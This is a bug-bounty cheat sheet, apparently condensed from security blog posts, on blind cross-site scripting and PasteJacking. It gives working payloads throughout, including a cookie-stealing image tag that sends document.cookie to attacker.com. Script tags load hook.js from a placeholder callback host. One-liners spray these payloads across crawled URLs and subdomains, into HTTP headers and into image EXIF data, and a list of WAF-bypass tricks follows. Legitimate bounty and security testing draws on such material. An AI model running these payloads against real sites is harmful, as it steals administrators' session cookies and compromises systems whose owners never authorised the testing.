# : Mastering Blind XSS — Real-World Techniques for High Bounties
- Source: (Sep 25, 2025 + Aug 25, 2025) — infosecwriteups.com
- Blind XSS + PasteJacking: stealth payload injection with out-of-band callbacks

## What is Blind XSS?
Payloads stored in places you can't see: logs, admin panels, email templates, file metadata, chat systems. Only fires later when backend systems render the data. No instant feedback — requires reliable out-of-band callbacks.

## Injection Vectors
### Common Blind XSS Sinks
- Comment/review systems
- Chat/messaging platforms with rich text
- Support ticket systems
- Contact forms
- User profile fields (name, bio, website)
- File upload metadata (EXIF, filename)
- HTTP headers (User-Agent, X-Forwarded-For, Referer)
- Email templates

### PasteJacking — Clipboard Exploitation
Attack abuses how web apps handle content pasted from clipboard:
```html
<img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">
```
Paste payload into rich-text editors, comment boxes — fires when admin views the stored content.

## Tools Setup

### Blind XSS Servers
```bash
# XSSHunter - free web-based (bxsshunter.com)
# Burp Collaborator - built into Burp Pro
# interactsh - self-hosted, from ProjectDiscovery
# xss.report
```

### Browser Extensions
- Blind XSS Manager — configure once with your server URL, auto-injects to forms

### Burp Match & Replace (Automated Injection)
Configure Burp to auto-inject payloads into every request:
1. Go to Proxy → Options → Match and Replace
2. Add rule: Replace `User-Agent` header with payload
3. Every request now carries your blind XSS payload

### User-Agent Switcher (No Burp Alternative)
Configure browser extension to use payload as custom User-Agent string.

## Automation Script (One-Liner BXSS)
```bash
# Crawl targets and inject payload into headers
cat urls.txt | bxss -payload '"><script src=https://YOUR-BLIND-XSS-CALLBACK.example/hook.js></script>' -header "X-Forwarded-For"

# GF patterns + blind XSS
cat urls.txt | gf xss | uro | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence

# Mass sub to blind XSS
subfinder -d target.com | gau | bxss -appendMode \
  -payload '"><script src=https://YOUR-BLIND-XSS-CALLBACK.example/hook.js></script>' -parameters
```

## Advanced Technique: EXIF/XSS via Image Metadata
Inject payload into JPG EXIF data — fires when admin panel processes uploaded images:
```bash
exiftool -Comment='"><script src=https://YOUR-BLIND-XSS-CALLBACK.example/hook.js></script>' image.jpg
```

## Where to Inject Headers
- `User-Agent`
- `X-Forwarded-For`
- `Referer`
- `X-Forwarded-Host`
- `Cookie`
- Custom headers logged by backend

## WAF Bypass for Blind XSS
- Double/triple URL encoding payloads
- HTML entity encoding
- Split payload across multiple fields
- Use SVG/iframe-based vectors instead of <script>
- String.fromCharCode obfuscation
- atob() base64 decoding

## Reporting Tips
- Include screenshot of blind XSS callback dashboard
- Show impact: what the admin panel exposes (user data, tokens, internal tools)
- Chain with other vulnerabilities for maximum severity
- Always show real-world exploit scenario, not just "XSS fires"
